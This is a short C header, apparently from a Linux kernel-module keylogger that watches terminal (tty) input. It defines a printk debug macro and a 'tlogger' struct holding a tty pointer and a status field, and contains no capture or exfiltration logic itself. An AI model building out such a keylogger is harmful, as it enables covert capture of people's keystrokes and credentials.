#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#define DEBUG
#ifdef DEBUG
#define DBG(...) do { printk(__VA_ARGS__); } while(false)
#else
#define DBG(...) do {} while(false)
#endif

struct tlogger {
  struct tty_struct *tty;
  int status;
};

#endif	/* KEYLOGGER_H */
